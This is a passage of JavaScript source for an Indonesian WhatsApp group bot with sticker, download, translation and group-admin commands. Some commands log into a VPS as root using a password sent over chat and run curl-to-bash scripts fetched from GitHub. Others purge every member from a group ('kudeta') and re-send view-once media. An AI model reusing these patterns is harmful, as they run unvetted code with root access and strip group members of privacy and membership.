await Kenz.sendMessage(m.chat,{
			 image: imageBuffer,
 //thumbnailUrl: rees.thumbnail,
 //renderLargerThumbnail: true,
					caption: `> done`,
					footer: `\n${botname2}`,
					buttons: [
						{
							buttonId: `.${command}`,
							buttonText: {
								displayText: "lanjutt"
							}
						}
					],
					viewOnce: true,
				}, {
					quoted: m
				});
}
//Kenz si pler 🐎
break
case 'joko':{
 if (!text) {
 return m.reply("Tidak ada pembicaraan yang ditemukan.");
 }

 try {
 const response = await axios.get("https://api.siputzx.my.id/api/ai/joko?content=" + text);
 const audioUrl = `https://api.siputzx.my.id/api/tools/tts?voice=jv-ID-DimasNeural&rate=0&pitch=0&volume=0&text=${response.data.data}`;
 await Kenz.sendMessage(m.chat, { mimetype: 'audio/mp4', audio: { url: audioUrl } }, { quoted: m });
 } catch (error) {
 //m.reply("Terjadi kesalahan saat memproses permintaan.");
 }
 }
 //Kenz si pler 🐎
break 


//================================================================================

case "s": case "sticker": case "stiker": {
if (!/image|video/gi.test(mime)) return m.reply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await Kenz.downloadAndSaveMediaMessage(qmsg)
await Kenz.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
break

//================================================================================

case "swm": case "stickerwm": case "stikerwm": case "wm": {
if (!text) return m.reply(example("namamu dengan kirim media"))
if (!/image|video/gi.test(mime)) return m.reply(example("namamu dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await Kenz.downloadAndSaveMediaMessage(qmsg)
await Kenz.sendAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
}
break

//================================================================================

case "rvo": case "readviewonce": {
if (!m.quoted) return m.reply(example("dengan reply pesannya"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return Kenz.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return Kenz.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return Kenz.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break

//================================================================================

case "tourl2": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let media = await Kenz.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'Kenz.png');

let teks = directLink.toString()
await Kenz.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

//================================================================================
case "tt": case "tiktok": {
let momok = "`Tiktok Download ✅`"
if (!text) return m.reply(example("url"))
if (!text.startsWith("https://")) return m.reply(example("url"))
await tiktokDl(q).then(async (result) => {
await Kenz.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return m.reply("Error!")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: Kenz.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Tiktok Downloader ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await Kenz.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")

await Kenz.sendMessage(m.chat,{
			 video: {url:urlVid.url},
					caption: momok,
					footer: `\n${global.botname2}`,
					buttons: [
						{
							buttonId: `.ttmp3 ${text}`,
							buttonText: {
								displayText: "back sound"
							}
						},
					],
					viewOnce: true,
				}, {
					quoted: m
				});
}
}).catch(e => console.log(e))
await Kenz.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break


case 'tourl': {
				if (!mime) return Reply(`Kirim/Balas Video/Gambar Dengan Caption ${prefix + command}`);
				await emote('⏱️');
				try {
					let media = await Kenz.downloadAndSaveMediaMessage(quoted);
					if (/image|video/.test(mime)) {
						let response = await CatBox(media);
						let fileSize = (fs.statSync(media).size / 1024).toFixed(2);
						let uploadDate = new Date().toLocaleString();
						let uploader = m.pushName;
						let caption = `🔗 *Link Media* : ${response}\n📅 *Tanggal Upload* : ${uploadDate}\n📂 *Ukuran File* : ${fileSize} KB\n👤 *Pengunggah* : ${uploader}`.trim();
						reply(caption);
					} else if (!/image/.test(mime)) {
						let response = await CatBox(media);
						reply(response);
					} else {
					Reply(`Jenis media tidak didukung!`);
					}
					await fs.unlinkSync(media);
				} catch (err) {
					console.log(err);
					Reply("Ups, terjadi kesalahan saat mengunggah media. Coba lagi ya! 😅");
				}
			}
			//Kenz si pler 🐎
break ;

//================================================================================

case "tr": case "translate": {
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return m.reply(example("id good night"))
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
if (!text) return m.reply(example("id good night"))
if (args.length < 1) return m.reply(example("id good night"))
if (!m.quoted.text) return m.reply(example("id good night"))
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
m.reply(result[0])
}
} else {
return m.reply(example("id good night"))
}}
break

//================================================================================

case "tohd": case "hd": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let foto = await Kenz.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await Kenz.sendMessage(m.chat, {image: result}, {quoted: m})
await fs.unlinkSync(foto)
}
break

//================================================================================

case "add": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await Kenz.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await Kenz.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return m.reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return m.reply(JSON.stringify(res, null, 2))
}} else {
return m.reply(example("62838###"))
}
}
break

//================================================================================
case "kicktime": case "kiktime": {
    if (!m.isGroup) return reply(mess.group);
    if (!isCreator && !m.isAdmin) return reply(mess.admin);
    if (!m.isBotAdmin) return reply(mess.botAdmin);

    if (text || m.quoted) {
        const args = text.split("|"); // Splitting input into @tag and time
        const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0] ? args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false;
        const timeString = args[1] ? args[1].trim() : "10"; // Default time 10 seconds if no time is given

        // Check if timeString is a valid number
        let timeInSeconds = parseInt(timeString);
        if (isNaN(timeInSeconds)) return reply("Waktu yang diberikan tidak valid. Harap masukkan waktu dalam detik.");

        var onWa = await Kenz.onWhatsApp(input.split("@")[0]);
        if (onWa.length < 1) return reply("Nomor tidak terdaftar di WhatsApp");

        // Inform the group about the kick time
        await reply(`User ${input.split("@")[0]} akan dikeluarkan dalam ${timeInSeconds} detik...`);

        // Start the countdown
        let countdownMessage = await Kenz.sendMessage(m.chat, { text: `Kicking user in: ${timeInSeconds} detik...` });

        // Countdown loop
        let interval = setInterval(async () => {
            timeInSeconds--;
            if (timeInSeconds <= 0) {
                clearInterval(interval); // Stop the countdown

                // Kick the user out of the group
                const res = await Kenz.groupParticipantsUpdate(m.chat, [input], 'remove');
                await Kenz.sendMessage(m.chat, { text: `Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini` });

                // Delete countdown message
                await Kenz.deleteMessage(m.chat, countdownMessage.key);
            } else {
                // Update countdown message
                await Kenz.sendMessage(m.chat, { text: `Kicking user in: ${timeInSeconds} detik...` }, { quoted: countdownMessage });
            }
        }, 1000); // Every 1 second

    } else {
        return reply(example("@tag|waktu"));
    }
}
break;

case'dor': case "kick": case "kik": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await Kenz.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await Kenz.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply(example("@tag/reply"))
}
}
break

//================================================================================

case "leave": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
await m.reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await Kenz.groupLeave(m.chat)
}
break

//================================================================================

case "resetlinkgc": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
await Kenz.groupRevokeInvite(m.chat)
m.reply("Berhasil mereset link grup ✅")
}
break

//================================================================================

case "tagall": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await Kenz.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

//================================================================================

case "linkgc": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await Kenz.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await Kenz.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//================================================================================

case "ht": case "hidetag": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let member = m.metadata.participants.map(v => v.id)
await Kenz.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break

//================================================================================

case "joingc": case "join": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return m.reply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await Kenz.groupAcceptInvite(result)
m.reply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

//================================================================================

case "get": case "g": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("https://example.com"))
let data = await fetchJson(text)
m.reply(JSON.stringify(data, null, 2))
}
break

//================================================================================

case "joinch": case "joinchannel": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await Kenz.newsletterMetadata("invite", result)
await Kenz.newsletterFollow(res.id)
m.reply(`
*Berhasil join channel whatsapp ✅*
* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*
`)
}
break

//================================================================================

case "on": case "off": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let gc = Object.keys(db.groups[m.chat])
if (!text || isNaN(text)) {
let teks = "\n*乂 List opstion group settings*\n\n"
await gc.forEach((i, e) => {
teks += `* ${e + 1}. ${capital(i)} : ${db.groups[m.chat][i] ? "_aktif_" : "_tidak aktif_"}\n`
})
teks += `\n Contoh penggunaan *.${command}* 1\n`
return m.reply(teks)
}
const num = Number(text)
let total = gc.length
if (num > total) return
const event = gc[num - 1]
global.db.groups[m.chat][event] = command == "on" ? true : false
return m.reply(`Berhasil *${command == "on" ? "mengaktifkan" : "mematikan"} ${event}* di grup ini`)
}
break

//================================================================================

case "closegc": case "close": 
case "opengc": case "open": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await Kenz.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await Kenz.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break
//===
case 'closetime':
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.admin)
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
 reply(`Close time ${q} dimulai dari sekarang`)
setTimeout( () => {
const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
Kenz.groupSettingUpdate(from, 'announcement')
reply(close)
}, timer)
break

case "opentime": {
if (!m?.isGroup) return reply("Khusus Dalam Group")
if (!isAdmins && !isCreator) return reply("Khusus Admin Group")
if (!isBotAdmins) return reply("Jadikan Bot Sebagai Admin Terlebih Dahulu Jika Ingin Menggunakan Fitur Ini")
if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'hari') {
var timer = args[0] * `86400000`
} else {
return reply('*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik')
}
reply(`Open Time ${q} Dimulai Dari Sekarang`)
setTimeout(() => {
const nomor = m.participant
const open = `*Tepat Waktu* Grup Dibuka Oleh Admin\nSekarang Member Dapat Mengirim Pesan`
Kenz.groupSettingUpdate(m.chat, 'not_announcement')
reply(open)
}, timer)
}
break
//================================================================================

case "kudetagc": case "kudeta": {
if (!isCreator) return Reply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return m.reply("Grup Ini Sudah Tidak Ada Member!")
await m.reply("Kudeta Grup By Kenz Starting 🔥")
for (let i of memberFilter) {
await Kenz.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await m.reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break

//================================================================================

case "demote":
case "promote": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await Kenz.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await Kenz.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return m.reply(example("@tag/6285###"))
}
}
break

//================================================================================
case "installtema": case "installthema": {
if (!isCreator) return m.reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
let teksnya = `\nPilih Jenis Tema Yang Tersedia`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ title : "Klik Disini",
sections: [{
title: "",
rows: [
{ title: "*✨ Install Tema Stellar Membuat panel Pterodactyl Anda lebih modern dan menarik dengan tema Stellar*", id: ".response_installtema1" }, 
{ title: "*✨ Install Tema Billing Membuat panel Pterodactyl Anda lebih modern dan menarik dengan tema Billing*", id: ".response_installtema2" }, 
{ title: "*✨ Install Tema Enigma Membuat panel Pterodactyl Anda lebih modern dan menarik dengan tema Enigma*", id: ".response_installtema3" },
{ title: "*✨ Install Tema Elysium Membuat panel Pterodactyl Anda lebih modern dan menarik dengan tema Elysium*", id: ".response_installtema4" },
{ title: "*✨ Install Depend Untuk Melakukan Install Tema Nebula Sebelum Menginstall Tema Nebula Install Depend*", id: ".response_installtema5" },
{ title: "*✨ Install Tema Nebula Membuat panel Pterodactyl Anda lebih modern dan menarik dengan tema Nebula*", id: ".response_installtema6" },
{ title: "*✨ Install Tema Nightcore Membuat panel Pterodactyl Anda lebih modern dan menarik dengan tema Nightcore*", id: ".response_installtema7" }
]}]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
await Kenz.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break

//================================================================================

case "response_installtema1": {
if (!isCreator) return m.reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await m.reply("Memproses Instalasi Tema Panel\nSilahkan Tunggu 1-10 Menit")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply('Berhasil Menginstall Tema Pterodactyl ✅')
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "response_installtema2": {
if (!isCreator) return m.reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await m.reply("Memproses Instalasi Tema Panel\nSilahkan Tunggu 1-10 Menit")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply('Berhasil Menginstall Tema Pterodactyl ✅')
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "response_installtema3": {
if (!isCreator) return m.reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await m.reply("Memproses Instalasi Tema Panel\nSilahkan Tunggu 1-10 Menit")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply('Berhasil Menginstall Tema Pterodactyl ✅')
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`); // Key Token : skyzodev
stream.write('1\n');
stream.write('3\n');
stream.write('\n');
stream.write('https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s\n');
stream.write('https://chat.whatsapp.com/FYzsZkNZnGu7a4Y32aGx6j\n');
stream.write('yes\n');
stream.write('x\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "response_installtema4": {
    if (!isCreator) return m.reply(mess.owner)
    if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

    let ipvps = global.installtema.vps
    let passwd = global.installtema.pwvps
    let pilihan = text

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    }
        
    const command = `bash <(curl -s https://raw.githubusercontent.com/LeXcZxMoDz9/kontol/refs/heads/main/bangke.sh)`
    const ress = new Client();

    await m.reply("Memproses Instalasi Tema Panel\nSilahkan Tunggu 1-10 Menit")

    ress.on('ready', () => {
        ress.exec(command, (err, stream) => {
            if (err) throw err
            stream.on('close', async (code, signal) => {    
                await m.reply('Berhasil Menginstall Tema Pterodactyl ✅')
                ress.end()
            }).on('data', async (data) => {
                console.log(data.toString())
                stream.write(`1\n`)
                stream.write(`2\n`)
                stream.write(`yes\n`)
                stream.write(`x\n`)
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data)
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        m.reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
}
break

//================================================================================

case "response_installtema5": {
    if (!isCreator) return m.reply(mess.owner)
    if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

    let ipvps = global.installtema.vps
    let passwd = global.installtema.pwvps
    let pilihan = text

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    }
        
    const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`
    const ress = new Client();

    await m.reply("Memproses Instalasi Tema Panel\nSilahkan Tunggu 1-10 Menit")

    ress.on('ready', () => {
        ress.exec(command, (err, stream) => {
            if (err) throw err
            stream.on('close', async (code, signal) => {    
                await m.reply('Berhasil Menginstall Tema Pterodactyl ✅')
                ress.end()
            }).on('data', async (data) => {
                console.log(data.toString())
                stream.write(`1\n`)
                stream.write(`2\n`)
                stream.write(`yes\n`)
                stream.write(`x\n`)
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data)
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        m.reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
}
break

//================================================================================

case "response_installtema6": {
    if (!isCreator) return m.reply(mess.owner)
    if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

    let ipvps = global.installtema.vps
    let passwd = global.installtema.pwvps
    let pilihan = text

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    }
        
    const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`
    const ress = new Client();

    await m.reply("Memproses Instalasi Tema Panel\nSilahkan Tunggu 1-10 Menit")

    ress.on('ready', () => {
        ress.exec(command, (err, stream) => {
            if (err) throw err
            stream.on('close', async (code, signal) => {    
                await m.reply('Berhasil Menginstall Tema Pterodactyl ✅')
                ress.end()
            }).on('data', async (data) => {
                console.log(data.toString())
                stream.write(`1\n`)
                stream.write(`2\n`)
                stream.write(`yes\n`)
                stream.write(`x\n`)
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data)
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        m.reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
}
break

//================================================================================
case "response_installtema7": {
    if (!isCreator) return m.reply(mess.owner)
    if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

    let ipvps = global.installtema.vps
    let passwd = global.installtema.pwvps
    let pilihan = text

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    }
        
    const command = `bash <(curl https://raw.githubusercontent.com/NoPro200/Pterodactyl_Nightcore_Theme/main/install.sh)`
    const ress = new Client();

    await m.reply("Memproses Instalasi Tema Panel\nSilahkan Tunggu 1-10 Menit")

    ress.on('ready', () => {
        ress.exec(command, (err, stream) => {
            if (err) throw err
            stream.on('close', async (code, signal) => {    
                await m.reply('Berhasil Menginstall Tema Pterodactyl ✅')
                ress.end()
            }).on('data', async (data) => {
                console.log(data.toString())
                stream.write(`1\n`)
                stream.write(`2\n`)
                stream.write(`yes\n`)
                stream.write(`x\n`)
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data)
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        m.reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
}
break

case "uninstalltema": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await m.reply("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemastellar": case "installtemastelar": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema stellar* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemabilling": case "instaltemabiling": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

